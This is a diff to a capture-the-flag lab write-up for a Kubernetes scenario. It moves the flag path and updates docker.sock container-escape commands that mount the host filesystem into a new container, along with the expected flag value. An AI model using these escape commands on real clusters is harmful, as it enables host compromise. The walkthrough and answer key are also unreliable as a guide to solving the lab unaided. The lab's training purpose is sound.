@@ -24,7 +24,7 @@
 | Difficulty | L1 |
 | Type | k8s (KIND cluster) |
 | Cluster Name | cve-k8s-17-docker-sock |
-| Flag Location | `/host-flag/flag.txt` on KIND node, mounted into pod at `/host-flag` |
+| Flag Location | `/home/kianabin/cve-flags/k8s-17/flag.txt` on the host (reachable only through the Docker daemon) |
 
 ## Attack Path Summary
 1. Pod has `/var/run/docker.sock` mounted via hostPath (extraMounts map host Docker socket into KIND node, then hostPath into pod)
@@ -71,13 +71,13 @@ Run a new container through the host Docker that mounts the host filesystem:
 
 ```bash
 docker run --rm \
-    -v /host-flag:/mnt/flag \
+    -v /home/kianabin/cve-flags/k8s-17:/mnt/flag \
     alpine:latest \
     cat /mnt/flag/flag.txt
 ```
 
 **Explanation:**
-- `-v /host-flag:/mnt/flag` mounts the KIND node's `/host-flag` directory (which contains `flag.txt`) into the new container at `/mnt/flag`
+- `-v /home/kianabin/cve-flags/k8s-17:/mnt/flag` mounts the host's flag directory (which contains `flag.txt`) into the new container at `/mnt/flag`
 - `alpine:latest` is the image to run (will be pulled if not cached)
 - `cat /mnt/flag/flag.txt` reads the flag file
 
@@ -101,7 +101,7 @@ docker run --rm -it \
 From the escape shell:
 
 ```bash
-cat /host/host-flag/flag.txt
+cat /host/home/kianabin/cve-flags/k8s-17/flag.txt
 # Or explore the full host filesystem under /host/
 ```
 
@@ -124,9 +124,8 @@ docker run --rm --network=host alpine:latest ip addr
 
 ### Step 6: Capture Flag
 - Flag format: `flag{k8s-17-*}`
-- Flag location: `/host-flag/flag.txt` on the KIND node
-- Direct read: `cat /host-flag/flag.txt` from inside the pod (the flag file is mounted directly)
-- Via Docker escape: `docker run --rm -v /host-flag:/mnt alpine cat /mnt/flag.txt`
+- Flag location: `/home/kianabin/cve-flags/k8s-17/flag.txt` on the host (reachable only through the Docker daemon)
+- Via Docker escape: `docker run --rm -v /home/kianabin/cve-flags/k8s-17:/mnt alpine cat /mnt/flag.txt`
 - Expected output: `flag{k8s-17-default}` (or custom value from `CVE_FLAG`)
 
 ## Verification Commands
@@ -141,7 +140,7 @@ kubectl exec docker-escape-pod -- ls -la /var/run/docker.sock
 # Expected: srw-rw---- 1 root docker ... /var/run/docker.sock
 
 # Quick exploit verification (single line)
-kubectl exec docker-escape-pod -- docker run --rm -v /host-flag:/mnt alpine cat /mnt/flag.txt
+kubectl exec docker-escape-pod -- docker run --rm -v /home/kianabin/cve-flags/k8s-17:/mnt alpine cat /mnt/flag.txt
 ```
 
 ## 此场景利用了哪些知识
